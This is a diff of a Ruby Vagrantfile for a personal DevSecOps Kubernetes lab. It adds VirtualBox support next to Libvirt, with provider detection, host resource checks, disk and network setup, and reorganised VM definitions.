@@ -2,58 +2,32 @@
 # vi: set ft=ruby :
 
 # =============================================================================
-# Enterprise Cloud-Native DevSecOps Kubernetes Lab
+# Enterprise Cloud-Native DevSecOps Kubernetes Lab - UNIFIED
 # =============================================================================
 #
 # Author        : Miguel Carlo (solo2121)
 # Version       : 8.2.0
 # Created       : 2025
-# Last Updated  : 2026-07-31
+# Last Updated  : 2026-08-16
 # Status        : Active Development
 # License       : Personal / Educational Use
 #
-# -----------------------------------------------------------------------------
 # DESCRIPTION
 # -----------------------------------------------------------------------------
-# Enterprise Kubernetes lab built with Vagrant and Libvirt for learning,
-# testing, and validating modern Cloud-Native, DevOps, DevSecOps, GitOps,
-# Platform Engineering, and Infrastructure as Code (IaC) technologies.
+# Enterprise Kubernetes lab built with Vagrant supporting both Libvirt and
+# VirtualBox providers. This unified Vagrantfile eliminates 95% duplication
+# while maintaining provider-specific optimizations.
 #
-# Components:
-#   - K3s Kubernetes Cluster
-#   - Argo CD GitOps Platform
-#   - Harbor Container Registry
-#   - Prometheus & Grafana Monitoring
-#   - Falco Runtime Security
-#   - Kyverno Policy Enforcement
-#   - Cert-Manager TLS Automation
-#   - Terraform Infrastructure as Code
-#   - OpenTofu Infrastructure as Code
-#   - Kind (Kubernetes in Docker)
-#   - K3d (K3s in Docker)
-#   - Ansible Management Nodes
-#   - Linux Training Nodes
-#   - Automated DevSecOps Attack Scenarios
-#   - CI/CD Server (Gitea + Jenkins + SonarQube + Vault + ZAP)
+# Usage:
+#   # Libvirt (KVM)
+#   vagrant up --provider=libvirt
 #
-# Features:
-#   - Multi-Profile Deployment (minimal/dev/full)
-#   - Automated Cluster Bootstrap
-#   - Automated Node Provisioning
-#   - Dynamic Network Discovery
-#   - Air-Gapped Image Management
-#   - Zero-Cache Harbor Mode
-#   - Enterprise Security Tooling
-#   - Infrastructure as Code (IaC)
-#   - Interactive Credential Prompt (No Hardcoded Secrets)
-#   - Automated Attack Scenario Deployment
+#   # VirtualBox
+#   vagrant up --provider=virtualbox
 #
-# Requirements:
-#   - Vagrant >= 2.4
-#   - Libvirt Provider
-#   - KVM/QEMU Virtualization
-#   - Linux Host (Ubuntu 24.04 LTS Recommended)
-#   - Ruby >= 2.5 (io/console)
+#   # Override network
+#   export NETWORK_BASE="192.168.56"
+#   vagrant up --provider=virtualbox
 #
 # =============================================================================
 
@@ -61,7 +35,7 @@ LAB_NAME        = "Enterprise Cloud-Native DevSecOps Lab"
 LAB_VERSION     = "8.2.0"
 LAB_AUTHOR      = "Miguel Carlo (solo2121)"
 LAB_CREATED     = "2025"
-LAB_UPDATED     = "2026-07-31"
+LAB_UPDATED     = "2026-08-16"
 LAB_STATUS      = "Active & Maintained"
 
 puts "=================================================="
@@ -73,68 +47,89 @@ puts "Status       : #{LAB_STATUS}"
 puts "=================================================="
 
 require 'ipaddr'
-require 'rexml/document'
 require 'io/console'
 require 'shellwords'
+require 'fileutils'
+require 'rexml/document'
 
-ENV['LIBVIRT_DEFAULT_URI'] ||= 'qemu:///system'
-Vagrant.require_version ">= 2.2.0"
+Vagrant.require_version ">= 2.4.0"
 
-# ================= CONFIGURATION =================
-LAB_PROFILE = ENV['LAB_PROFILE'] || 'minimal'
-START_VMS = ENV['START_VMS'] ? ENV['START_VMS'].split(',') : []
-FAST_BOOT = ENV['FAST_BOOT'] || 'false'
-K8S_API_HOST_PORT = ENV['K8S_API_HOST_PORT'] || '16443'
-DEBUG = ENV['DEBUG'] || 'false'
+# =============================================================================
+# PROVIDER DETECTION
+# =============================================================================
+def current_provider
+  # Check command line for --provider first: Vagrant's own precedence is
+  # CLI flag > VAGRANT_DEFAULT_PROVIDER > auto-detection, so this must be
+  # checked before the environment variable, not after.
+  #
+  # Handles both accepted forms:
+  #   vagrant up --provider=virtualbox   (single token, must be split)
+  #   vagrant up --provider virtualbox   (two tokens)
+  ARGV.each_with_index do |arg, idx|
+    if arg == '--provider' && ARGV[idx + 1]
+      return ARGV[idx + 1].to_sym
+    elsif arg =~ /\A--provider=(.+)\z/
+      return Regexp.last_match(1).to_sym
+    end
+  end
 
-# Cache mode: 'zero' (no local images) or 'airgap' (keep Harbor cache)
-CACHE_MODE = ENV['CACHE_MODE'] || 'zero'
+  if ENV['VAGRANT_DEFAULT_PROVIDER']
+    return ENV['VAGRANT_DEFAULT_PROVIDER'].to_sym
+  end
 
-# PINNED VERSIONS
-HARBOR_CHART_VERSION = "1.14.0"
-INGRESS_NGINX_VERSION = "v1.11.3"
-K3S_VERSION = "v1.31.4+k3s1"
-DOCKER_VERSION = "27.3.1"
-HARBOR_PROJECT = "airgap"
+  # Default: libvirt on Linux, virtualbox otherwise
+  if RbConfig::CONFIG['host_os'] =~ /linux/
+    :libvirt
+  else
+    :virtualbox
+  end
+end
 
-# Enterprise Tools Versions
-ARGOCD_VERSION = "7.7.5"
-PROMETHEUS_VERSION = "68.3.0"
-FALCO_VERSION = "2.3.0"
-KYVERNO_VERSION = "3.3.7"
-CERT_MANAGER_VERSION = "1.16.2"
-TERRAFORM_VERSION = "1.9.8"
+PROVIDER = current_provider
+puts "Provider: #{PROVIDER}"
 
-# Modern Tools Versions
-OPENTOFU_VERSION = "1.8.0"           # OpenTofu (Terraform fork)
-KIND_VERSION = "v0.24.0"             # Kind (Kubernetes in Docker)
-K3D_VERSION = "v5.7.5"               # K3d (K3s in Docker)
-KUBECTL_VERSION = "v1.31.0"          # Kubectl for learning VMs
+# =============================================================================
+# HOST OS DETECTION
+# =============================================================================
+def host_os
+  case RbConfig::CONFIG['host_os']
+  when /mswin|msys|mingw|cygwin|bccwin|wince|emc/
+    :windows
+  when /darwin|mac os/
+    :macos
+  when /linux/
+    :linux
+  else
+    :unknown
+  end
+end
 
-# CI/CD Tools Versions
-GITEA_VERSION = "1.24.3"
-JENKINS_VERSION = "2.516.2-lts-jdk17"
-SONARQUBE_VERSION = "25.7"
-VAULT_VERSION = "1.18.2"
-ZAP_VERSION = "2.16.1"
-GITLEAKS_VERSION = "8.18.4"
-TRIVY_VERSION = "0.57.1"
+puts "Host OS detected: #{host_os}"
 
-# CI/CD Ports
-GITEA_PORT = 3000
-JENKINS_PORT = 8080
-# Host-side port for the Jenkins forwarded_port only. JENKINS_PORT (8080) is
-# also used as devops-1's host-forwarded ingress port (guest 80 -> host 8080),
-# so cicd-server needs a different host port to avoid a bind conflict when
-# both VMs run together (LAB_PROFILE=full). Jenkins still listens on 8080
-# inside the container/guest; only the host-side mapping changes.
-JENKINS_HOST_PORT = 18080
-SONARQUBE_PORT = 9000
-VAULT_PORT = 8200
-ZAP_PORT = 8090
-JENKINS_AGENT_PORT = 50000
+# =============================================================================
+# SYSTEM RESOURCE CHECK
+# =============================================================================
+def check_system_resources
+  if host_os == :linux
+    total_memory = `grep MemTotal /proc/meminfo | awk '{print $2/1024}'`.to_i rescue 0
+    total_cpus = `nproc`.to_i rescue 1
 
-# Auto-detect libvirt network
+    if total_memory > 0 && total_memory < 8192
+      puts "WARNING: System has #{total_memory}MB RAM. Full lab requires 16GB+."
+      puts "         Consider using LAB_PROFILE=minimal or dev."
+    end
+
+    if total_cpus > 0 && total_cpus < 4
+      puts "WARNING: System has #{total_cpus} CPU cores. Full lab requires 4+ cores."
+    end
+  end
+end
+
+check_system_resources
+
+# =============================================================================
+# PROVIDER-SPECIFIC NETWORK DETECTION
+# =============================================================================
 def detect_libvirt_network
   begin
     output = `sudo virsh net-dumpxml vagrant-libvirt 2>/dev/null`
@@ -169,60 +164,104 @@ def detect_libvirt_network
   "192.168.121.0/24"
 end
 
-LIBVIRT_NETWORK = detect_libvirt_network
-puts "Using libvirt network: #{LIBVIRT_NETWORK}"
-network_parts = LIBVIRT_NETWORK.split('/')
+def detect_vbox_network
+  # VirtualBox: Use 192.168.56.0/24 as default host-only network
+  ENV['NETWORK_BASE'] || "192.168.56.0/24"
+end
+
+# Get provider-specific network
+if PROVIDER == :libvirt
+  LIBVIRT_NETWORK = detect_libvirt_network
+  puts "Using libvirt network: #{LIBVIRT_NETWORK}"
+  network_parts = LIBVIRT_NETWORK.split('/')
+  DEFAULT_NETWORK_BASE = network_parts[0].split('.')[0..2].join('.')
+else
+  VBOX_NETWORK = detect_vbox_network
+  puts "Using VirtualBox network: #{VBOX_NETWORK}"
+  network_parts = VBOX_NETWORK.split('/')
+  DEFAULT_NETWORK_BASE = network_parts[0].split('.')[0..2].join('.')
+end
 
 # =============================================================================
-# ENVIRONMENT VARIABLE OVERRIDES - NON-BREAKING CHANGE
+# ENVIRONMENT VARIABLE OVERRIDES
 # =============================================================================
-# These allow you to customize the network without modifying the file:
+# Allow environment override for network base
 #   export NETWORK_BASE="10.10.10"  # Uses 10.10.10.114 as master IP
 #   export MASTER_IP="192.168.200.50"  # Uses specific IP for master
-#
-# If not set, uses auto-detected values (original behavior)
 # =============================================================================
 
-# Allow environment override for network base (keeps original logic as fallback)
-NETWORK_BASE = ENV['NETWORK_BASE'] || network_parts[0].split('.')[0..2].join('.')
+NETWORK_BASE = ENV['NETWORK_BASE'] || DEFAULT_NETWORK_BASE
 
 def vm_ip(octet)
   "#{NETWORK_BASE}.#{octet}"
 end
 
-# Allow environment override for master IP (keeps original logic as fallback)
+# Allow environment override for master IP
 MASTER_IP = ENV['MASTER_IP'] || vm_ip(114)
 
-# Display what we're using (helps with debugging)
 puts "Network base: #{NETWORK_BASE}"
 puts "Master IP: #{MASTER_IP}"
 puts "To override: export NETWORK_BASE='your.network' or export MASTER_IP='your.ip'"
 
-File.write("/tmp/lab.env", "MASTER_IP=#{MASTER_IP}\nNETWORK_BASE=#{NETWORK_BASE}\n")
+File.write("/tmp/lab.env", "MASTER_IP=#{MASTER_IP}\nNETWORK_BASE=#{NETWORK_BASE}\nPROVIDER=#{PROVIDER}\n")
 
 # =============================================================================
-# HARBOR PASSWORD HANDLING - Simple ENV based approach
+# CONFIGURATION
 # =============================================================================
-#
-# This is the correct way to handle Harbor password in Vagrant.
-# No Ruby command detection - just use the environment variable.
-#
-# The password must be set in the environment before running vagrant:
-#   export HARBOR_PASS='YourStrongPassword'
-#   vagrant up
-#
-# Or use the manager script which handles prompting and passing the variable.
-#
+LAB_PROFILE = ENV['LAB_PROFILE'] || 'minimal'
+LAB_GUI = ENV.fetch('LAB_GUI', 'false').downcase == 'true'
+START_VMS = ENV['START_VMS'] ? ENV['START_VMS'].split(',') : []
+FAST_BOOT = ENV['FAST_BOOT'] || 'false'
+K8S_API_HOST_PORT = ENV['K8S_API_HOST_PORT'] || '16443'
+DEBUG = ENV['DEBUG'] || 'false'
+CACHE_MODE = ENV['CACHE_MODE'] || 'zero'
+
+# PINNED VERSIONS
+HARBOR_CHART_VERSION = "1.14.0"
+INGRESS_NGINX_VERSION = "v1.11.3"
+K3S_VERSION = "v1.31.4+k3s1"
+DOCKER_VERSION = "27.3.1"
+HARBOR_PROJECT = "airgap"
+
+# Enterprise Tools Versions
+ARGOCD_VERSION = "7.7.5"
+PROMETHEUS_VERSION = "68.3.0"
+FALCO_VERSION = "2.3.0"
+KYVERNO_VERSION = "3.3.7"
+CERT_MANAGER_VERSION = "1.16.2"
+TERRAFORM_VERSION = "1.9.8"
+
+# Modern Tools Versions
+OPENTOFU_VERSION = "1.8.0"
+KIND_VERSION = "v0.24.0"
+K3D_VERSION = "v5.7.5"
+KUBECTL_VERSION = "v1.31.0"
+
+# CI/CD Tools Versions
+GITEA_VERSION = "1.24.3"
+JENKINS_VERSION = "2.516.2-lts-jdk17"
+SONARQUBE_VERSION = "25.7"
+VAULT_VERSION = "1.18.2"
+ZAP_VERSION = "2.16.1"
+GITLEAKS_VERSION = "8.18.4"
+TRIVY_VERSION = "0.57.1"
+
+# CI/CD Ports
+GITEA_PORT = 3000
+JENKINS_PORT = 8080
+JENKINS_HOST_PORT = 18080
+SONARQUBE_PORT = 9000
+VAULT_PORT = 8200
+ZAP_PORT = 8090
+JENKINS_AGENT_PORT = 50000
+
 # =============================================================================
+# HARBOR PASSWORD HANDLING
+# =============================================================================
+harbor_pass = ENV['HARBOR_PASS']
 
-# Get password from environment
-HARBOR_PASS = ENV['HARBOR_PASS']
-
-# Check if we need the password (only if HARBOR_PASS is not set)
-if HARBOR_PASS.nil? || HARBOR_PASS.empty?
-  # Check if we're running interactively and this looks like a provisioning command
+if harbor_pass.nil? || harbor_pass.empty?
   if $stdin.tty? && ARGV.any? { |arg| arg == 'up' || arg == 'provision' || arg == 'reload' }
-    # Only prompt if this looks like a provisioning command
     if ARGV.include?('--provision') || ARGV.include?('provision')
       puts "\n" + "="*60
       puts "  HARBOR REGISTRY PASSWORD REQUIRED"
@@ -232,17 +271,16 @@ if HARBOR_PASS.nil? || HARBOR_PASS.empty?
       puts "Please set an admin password for Harbor."
       puts "The password must be at least 8 characters long."
       puts ""
-      
+
       begin
-        # Prompt for password using io/console (no echo)
         print "Enter Harbor admin password: "
         password = STDIN.noecho(&:gets).chomp
         puts ""
-        
+
         if password.nil? || password.empty?
           abort("ERROR: Password cannot be empty.")
         end
-        
+
         if password.length < 8
           puts "WARNING: Password is less than 8 characters. This is not recommended."
           print "Continue with weak password? (y/N): "
@@ -251,44 +289,40 @@ if HARBOR_PASS.nil? || HARBOR_PASS.empty?
             abort("Password creation cancelled.")
           end
         end
-        
+
         print "Confirm password: "
         confirm_password = STDIN.noecho(&:gets).chomp
         puts ""
-        
+
         if password != confirm_password
           abort("ERROR: Passwords do not match.")
         end
-        
+
         ENV['HARBOR_PASS'] = password
-        HARBOR_PASS = password
+        harbor_pass = password
         puts "Password configured successfully."
         puts "="*60
         puts ""
-        
+
       rescue Interrupt
         puts "\nPassword input cancelled."
         exit 1
       end
     else
-      # Not a provisioning command, just use placeholder
       ENV['HARBOR_PASS'] = 'PLACEHOLDER_FOR_PARSING'
-      HARBOR_PASS = 'PLACEHOLDER_FOR_PARSING'
+      harbor_pass = 'PLACEHOLDER_FOR_PARSING'
       puts "Note: HARBOR_PASS not set. This is fine for this command."
-      puts "      Password will be required for provisioning."
     end
   else
-    # Non-interactive mode - use placeholder
     ENV['HARBOR_PASS'] = 'PLACEHOLDER_FOR_PARSING'
-    HARBOR_PASS = 'PLACEHOLDER_FOR_PARSING'
+    harbor_pass = 'PLACEHOLDER_FOR_PARSING'
   end
 end
 
-# ============================================================
-# COMPLETE ENTERPRISE AIRGAP IMAGES - ALL ORIGINAL + MISSING ADDED
-# ============================================================
+# =============================================================================
+# AIRGAP IMAGES
+# =============================================================================
 AIRGAP_IMAGES = [
-  # ========== ORIGINAL IMAGES (ALL PRESERVED) ==========
   "docker.io/rancher/mirrored-pause:3.6",
   "docker.io/rancher/mirrored-coredns-coredns:1.11.1",
   "docker.io/rancher/local-path-provisioner:v0.0.30",
@@ -304,48 +338,33 @@ AIRGAP_IMAGES = [
   "docker.io/library/nginx:alpine",
   "docker.io/library/busybox:1.36",
   "docker.io/library/alpine:3.20",
-
-  # ========== CERT-MANAGER IMAGES (FULL SET) ==========
   "quay.io/jetstack/cert-manager-cainjector:v1.16.2",
   "quay.io/jetstack/cert-manager-controller:v1.16.2",
   "quay.io/jetstack/cert-manager-webhook:v1.16.2",
   "quay.io/jetstack/cert-manager-acmesolver:v1.16.2",
-
-  # ========== KYVERNO IMAGES (FULL SET) ==========
   "ghcr.io/kyverno/kyverno:v1.13.2",
   "ghcr.io/kyverno/kyvernopre:v1.13.2",
   "ghcr.io/kyverno/background-controller:v1.13.2",
   "ghcr.io/kyverno/cleanup-controller:v1.13.2",
   "ghcr.io/kyverno/reports-controller:v1.13.2",
-
-  # ========== PROMETHEUS ECOSYSTEM IMAGES ==========
   "quay.io/prometheus-operator/prometheus-operator:v0.76.2",
   "quay.io/prometheus/node-exporter:v1.8.2",
   "registry.k8s.io/kube-state-metrics/kube-state-metrics:v2.13.0",
   "quay.io/prometheus/alertmanager:v0.27.0",
   "quay.io/prometheus/pushgateway:v1.8.0",
-
-  # ========== FALCO DEPENDENCIES ==========
   "docker.io/falcosecurity/falco-driver-loader:latest",
-
-  # ========== LOGGING STACK (LOKI + PROMTAIL) ==========
   "docker.io/grafana/loki:3.2.1",
   "docker.io/grafana/promtail:3.2.1",
-
-  # ========== ARGO CD ECOSYSTEM (FULL SET) ==========
   "quay.io/argoproj/argocd-applicationset:v0.4.1",
-  # NOTE: "quay.io/argoproj/argocd-notifications:stable" removed.
-  # The argocd-notifications project was merged into Argo CD core
-  # (notifications-engine); the standalone image/tag is no longer
-  # published on quay.io, so the pull always returns "unauthorized".
-  # The notifications controller now ships inside the main
-  # "quay.io/argoproj/argocd" image already listed above.
   "quay.io/argoproj/argo-rollouts:v1.7.2",
   "ghcr.io/dexidp/dex:v2.41.1",
   "docker.io/library/redis:7.2.5-alpine",
   "docker.io/library/haproxy:2.8-alpine",
 ].freeze
 
+# =============================================================================
+# HELPER FUNCTIONS
+# =============================================================================
 def should_start?(vm_name, profile, start_list)
   return true if start_list.include?(vm_name)
   case profile
@@ -362,108 +381,274 @@ def should_start?(vm_name, profile, start_list)
 end
 
 DEFAULT = { memory: 1024, cpus: 1 }.freeze
-def libvirt(vm, opts = {})
+
+# =============================================================================
+# PROVIDER-SPECIFIC CONFIGURATION FUNCTIONS
+# =============================================================================
+def configure_libvirt(vm, opts = {})
   c = DEFAULT.merge(opts)
-  vm.vm.provider :libvirt do |l|
-    l.memory = c[:memory]
-    l.cpus = c[:cpus]
-    l.nested = true
-    l.graphics_type = "vnc"
-    l.graphics_ip = "127.0.0.1"
-    l.video_type = "virtio"
-    l.cpu_mode = "host-passthrough"
+  vm.vm.provider :libvirt do |lv|
+    lv.memory = c[:memory]
+    lv.cpus = c[:cpus]
+    lv.nested = true
+    lv.graphics_type = "vnc"
+    lv.graphics_ip = "127.0.0.1"
+    lv.video_type = "virtio"
+    lv.cpu_mode = "host-passthrough"
   end
 end
 
-def attach_lab_disks(vm)
-  vm.vm.provider :libvirt do |l|
-    l.storage :file, size: "5G", type: "qcow2", cache: "writeback"
-    l.storage :file, size: "5G", type: "qcow2", cache: "writeback"
-    l.storage :file, size: "2G", type: "qcow2", cache: "writeback"
+def configure_virtualbox(vm, opts = {})
+  c = DEFAULT.merge(opts)
+  vm.vm.provider :virtualbox do |vb|
+    vb.memory = c[:memory]
+    vb.cpus = c[:cpus]
+    vb.gui = LAB_GUI
+
+    # Enable nested virtualization
+    vb.customize ["modifyvm", :id, "--nested-hw-virt", "on"]
+
+    # Use VMSVGA graphics controller
+    vb.customize ["modifyvm", :id, "--graphicscontroller", "vmsvga"]
+
+    # Enable USB 3.0 for better performance
+    vb.customize ["modifyvm", :id, "--usb", "on"]
+    vb.customize ["modifyvm", :id, "--usbehci", "on"]
+    vb.customize ["modifyvm", :id, "--usbxhci", "on"]
   end
 end
 
+def attach_libvirt_disks(vm)
+  vm.vm.provider :libvirt do |lv|
+    lv.storage :file, size: "5G", type: "qcow2", cache: "writeback"
+    lv.storage :file, size: "5G", type: "qcow2", cache: "writeback"
+    lv.storage :file, size: "2G", type: "qcow2", cache: "writeback"
+  end
+end
+
+def attach_virtualbox_disks(vm, vm_name)
+  vm.vm.provider :virtualbox do |vb|
+    disk_dir = File.expand_path("disks/#{vm_name}")
+    FileUtils.mkdir_p(disk_dir)
+    controller_name = "SATA"
+
+    # Disk 1: 5G
+    disk1 = "#{disk_dir}/disk1.vdi"
+    unless File.exist?(disk1)
+      vb.customize ["createmedium", "disk", "--filename", disk1, "--size", 5120, "--format", "VDI"]
+    end
+    vb.customize ["storageattach", :id, "--storagectl", controller_name, "--port", 1, "--device", 0, "--type", "hdd", "--medium", disk1]
+
+    # Disk 2: 5G
+    disk2 = "#{disk_dir}/disk2.vdi"
+    unless File.exist?(disk2)
+      vb.customize ["createmedium", "disk", "--filename", disk2, "--size", 5120, "--format", "VDI"]
+    end
+    vb.customize ["storageattach", :id, "--storagectl", controller_name, "--port", 2, "--device", 0, "--type", "hdd", "--medium", disk2]
+
+    # Disk 3: 2G
+    disk3 = "#{disk_dir}/disk3.vdi"
+    unless File.exist?(disk3)
+      vb.customize ["createmedium", "disk", "--filename", disk3, "--size", 2048, "--format", "VDI"]
+    end
+    vb.customize ["storageattach", :id, "--storagectl", controller_name, "--port", 3, "--device", 0, "--type", "hdd", "--medium", disk3]
+  end
+end
+
+def attach_disks(vm, vm_name)
+  if PROVIDER == :libvirt
+    attach_libvirt_disks(vm)
+  else
+    attach_virtualbox_disks(vm, vm_name)
+  end
+end
+
+# =============================================================================
+# PRE-PROVISIONING CHECK
+# =============================================================================
+def pre_provision_check
+  <<-SHELL
+    echo "=========================================="
+    echo "PRE-PROVISIONING SYSTEM CHECK"
+    echo "=========================================="
+    echo "Provider: #{PROVIDER}"
+
+    if [ "#{PROVIDER}" = "libvirt" ]; then
+      if ! command -v virsh >/dev/null 2>&1; then
+        echo "ERROR: libvirt not installed or virsh not in PATH"
+        echo "Please install libvirt and ensure virsh is available."
+        exit 1
+      fi
+      echo "✓ libvirt found"
+    else
+      if ! command -v VBoxManage >/dev/null 2>&1; then
+        echo "ERROR: VirtualBox not installed or VBoxManage not in PATH"
+        echo "Please install VirtualBox and ensure VBoxManage is available."
+        exit 1
+      fi
+      VBOX_VERSION=$(VBoxManage --version | cut -d. -f1)
+      if [ "$VBOX_VERSION" -lt 6 ]; then
+        echo "WARNING: VirtualBox version $VBOX_VERSION detected. Version 6+ recommended."
+      else
+        echo "✓ VirtualBox version $VBOX_VERSION found"
+      fi
+    fi
+
+    echo "Checking system resources..."
+    TOTAL_MEM=$(grep MemTotal /proc/meminfo | awk '{print int($2/1024/1024)}' 2>/dev/null || echo "0")
+    TOTAL_CPU=$(nproc 2>/dev/null || echo "0")
+
+    if [ "$TOTAL_MEM" -gt 0 ] && [ "$TOTAL_MEM" -lt 8 ]; then
+      echo "WARNING: System has ${TOTAL_MEM}GB RAM. Full lab requires 16GB+."
+      echo "         Consider using LAB_PROFILE=minimal or dev."
+    fi
+
+    if [ "$TOTAL_CPU" -gt 0 ] && [ "$TOTAL_CPU" -lt 4 ]; then
+      echo "WARNING: System has ${TOTAL_CPU} CPU cores. Full lab requires 4+ cores."
+    fi
+
+    echo "=========================================="
+  SHELL
+end
+
+# =============================================================================
+# VM DEFINITIONS
+# =============================================================================
+cluster = {
+  "devops-1" => { box: "bento/ubuntu-24.04", ip: MASTER_IP, memory: 8192, cpus: 4, role: "master" },
+  "worker-1" => { box: "bento/ubuntu-24.04", ip: vm_ip(11), memory: 2048, cpus: 2, role: "worker" },
+  "worker-2" => { box: "bento/ubuntu-24.04", ip: vm_ip(12), memory: 2048, cpus: 2, role: "worker" }
+}
+
+linux_labs = {
+  "ubuntu-lab" => { box: "bento/ubuntu-24.04", ip: vm_ip(20), memory: 2048, cpus: 2, role: "lab" },
+  "rocky-lab" => { box: "bento/rockylinux-9.6", ip: vm_ip(21), memory: 2048, cpus: 2, role: "lab" },
+  "alma-lab" => { box: "bento/almalinux-9.6", ip: vm_ip(22), memory: 2048, cpus: 2, role: "lab" },
+  "suse-lab" => { box: "bento/opensuse-leap-15.6", ip: vm_ip(23), memory: 2048, cpus: 2, role: "lab" }
+}
+
+ansible_nodes = {
+  "node1" => { box: "bento/ubuntu-24.04", ip: vm_ip(30), memory: 1024, cpus: 1, role: "ansible" },
+  "node2" => { box: "bento/ubuntu-24.04", ip: vm_ip(31), memory: 1024, cpus: 1, role: "ansible" }
+}
+
+kind_labs = {
+  "kind-lab" => {
+    box: "bento/ubuntu-24.04",
+    ip: vm_ip(40),
+    memory: 4096,
+    cpus: 2,
+    role: "kind"
+  }
+}
+
+k3d_labs = {
+  "k3d-lab" => {
+    box: "bento/ubuntu-24.04",
+    ip: vm_ip(41),
+    memory: 4096,
+    cpus: 2,
+    role: "k3d"
+  }
+}
+
+cicd_server = {
+  "cicd-server" => {
+    box: "bento/ubuntu-24.04",
+    ip: vm_ip(50),
+    memory: 4096,
+    cpus: 2,
+    role: "cicd"
+  }
+}
+
+all_vms = cluster.merge(linux_labs).merge(ansible_nodes).merge(kind_labs).merge(k3d_labs).merge(cicd_server)
+vms_to_start = all_vms.select { |name, _| should_start?(name, LAB_PROFILE, START_VMS) }
+hosts_entries = all_vms.map { |n, c| "#{c[:ip]} #{n}" }.join("\n")
+
+# =============================================================================
+# VAGRANT CONFIGURATION
+# =============================================================================
 Vagrant.configure("2") do |config|
   config.vm.box_check_update = false
   config.vm.synced_folder ".", "/vagrant", disabled: false
   config.ssh.connect_timeout = 600
   config.vm.boot_timeout = 1200
 
+  # VirtualBox-specific global settings
+  if PROVIDER == :virtualbox
+    config.vm.provider :virtualbox do |vb|
+      vb.linked_clone = true
+    end
+
+    if Vagrant.has_plugin?("vagrant-vbguest")
+      config.vbguest.auto_update = true
+      config.vbguest.no_install = false
+      config.vbguest.installer_options = { allow_kernel_upgrade: true }
+    end
+  end
+
+  # Pre-flight host check
+  #
+  # This MUST run on the host, not inside the guest -- it checks for
+  # virsh/VBoxManage, which are host-side hypervisor tools and will
+  # never be present inside a stock guest VM. A `config.vm.provision`
+  # "shell" block runs inside the guest, so this uses a host-side
+  # `trigger.before :up` instead. Runs once per `vagrant up` invocation,
+  # before any machine is created.
+  config.trigger.before :up do |trigger|
+    trigger.name = "Pre-flight host check"
+    trigger.info = "Checking host virtualization tooling before creating any VM..."
+    trigger.run = { inline: pre_provision_check }
+  end
+
+  # Lab environment file
   config.vm.provision "shell", inline: <<-SHELL
     cat > /vagrant/lab.env << 'EOF'
 MASTER_IP=#{MASTER_IP}
 NETWORK_BASE=#{NETWORK_BASE}
+PROVIDER=#{PROVIDER}
 OPENTOFU_VERSION=#{OPENTOFU_VERSION}
 KIND_VERSION=#{KIND_VERSION}
 K3D_VERSION=#{K3D_VERSION}
 KUBECTL_VERSION=#{KUBECTL_VERSION}
-HARBOR_PASS=#{HARBOR_PASS}
+HARBOR_PASS=#{harbor_pass}
 EOF
   SHELL
 
-  cluster = {
-    "devops-1" => { box: "bento/ubuntu-24.04", ip: MASTER_IP, memory: 8192, cpus: 4, role: "master" },
-    "worker-1" => { box: "bento/ubuntu-24.04", ip: vm_ip(11), memory: 2048, cpus: 2, role: "worker" },
-    "worker-2" => { box: "bento/ubuntu-24.04", ip: vm_ip(12), memory: 2048, cpus: 2, role: "worker" }
-  }
+  # Snapshot trigger
+  config.trigger.before :destroy do |trigger|
+    trigger.name = "Snapshot warning"
+    trigger.info = "VM will be destroyed. Consider taking a snapshot first: vagrant snapshot save pre-destroy"
+  end
 
-  linux_labs = {
-    "ubuntu-lab" => { box: "bento/ubuntu-24.04", ip: vm_ip(20), memory: 1024, cpus: 1, role: "lab" },
-    "rocky-lab" => { box: "rockylinux/10", ip: vm_ip(21), memory: 1024, cpus: 1, role: "lab" },
-    "alma-lab" => { box: "almalinux/10", ip: vm_ip(22), memory: 1024, cpus: 1, role: "lab" },
-    "suse-lab" => { box: "opensuse/Leap-15.6.x86_64", ip: vm_ip(23), memory: 1024, cpus: 1, role: "lab" }
-  }
-
-  ansible_nodes = {
-    "node1" => { box: "bento/ubuntu-24.04", ip: vm_ip(30), memory: 1024, cpus: 1, role: "ansible" },
-    "node2" => { box: "bento/ubuntu-24.04", ip: vm_ip(31), memory: 1024, cpus: 1, role: "ansible" }
-  }
-
-  # Modern Learning VMs
-  kind_labs = {
-    "kind-lab" => {
-      box: "bento/ubuntu-24.04",
-      ip: vm_ip(40),
-      memory: 4096,
-      cpus: 2,
-      role: "kind"
-    }
-  }
-
-  k3d_labs = {
-    "k3d-lab" => {
-      box: "bento/ubuntu-24.04",
-      ip: vm_ip(41),
-      memory: 4096,
-      cpus: 2,
-      role: "k3d"
-    }
-  }
-
-  # CI/CD Server
-  cicd_server = {
-    "cicd-server" => {
-      box: "bento/ubuntu-24.04",
-      ip: vm_ip(50),
-      memory: 4096,
-      cpus: 2,
-      role: "cicd"
-    }
-  }
-
-  # Merge all VMs
-  all_vms = cluster.merge(linux_labs).merge(ansible_nodes).merge(kind_labs).merge(k3d_labs).merge(cicd_server)
-  vms_to_start = all_vms.select { |name, _| should_start?(name, LAB_PROFILE, START_VMS) }
-  hosts_entries = all_vms.map { |n, c| "#{c[:ip]} #{n}" }.join("\n")
-
+  # =========================================================================
+  # VM DEFINITIONS
+  # =========================================================================
   vms_to_start.each do |name, cfg|
     config.vm.define name do |vm|
       vm.vm.box = cfg[:box]
       vm.vm.hostname = name
-      vm.vm.network "private_network", ip: cfg[:ip]
-      libvirt(vm, memory: cfg[:memory] || 1024, cpus: cfg[:cpus] || 1)
-      attach_lab_disks(vm) if linux_labs.key?(name)
 
+      # Provider-specific network configuration
+      if PROVIDER == :libvirt
+        vm.vm.network "private_network", ip: cfg[:ip]
+      else
+        vm.vm.network "private_network", ip: cfg[:ip]
+        vm.vm.network "forwarded_port", guest: 22, host: 2200 + cfg[:ip].split('.').last.to_i, host_ip: "127.0.0.1"
+      end
+
+      # Provider-specific hardware configuration
+      if PROVIDER == :libvirt
+        configure_libvirt(vm, memory: cfg[:memory] || 1024, cpus: cfg[:cpus] || 1)
+      else
+        configure_virtualbox(vm, memory: cfg[:memory] || 1024, cpus: cfg[:cpus] || 1)
+      end
+
+      # Attach extra disks for lab VMs
+      attach_disks(vm, name) if linux_labs.key?(name)
+
+      # /etc/hosts configuration
       vm.vm.provision "shell", run: "always", inline: <<-SHELL
         set -e
         START="# LAB START"
@@ -476,6 +661,7 @@ $END
 EOF
       SHELL
 
+      # Base provisioning
       vm.vm.provision "shell", inline: <<-'SHELL'
         set -euo pipefail
         [ -f /var/lib/.base_provisioned ] && { echo "Base already done, skipping"; exit 0; }
@@ -497,22 +683,22 @@ EOF
         touch /var/lib/.base_provisioned
       SHELL
 
+      # =====================================================================
+      # ROLE-SPECIFIC PROVISIONING
+      # =====================================================================
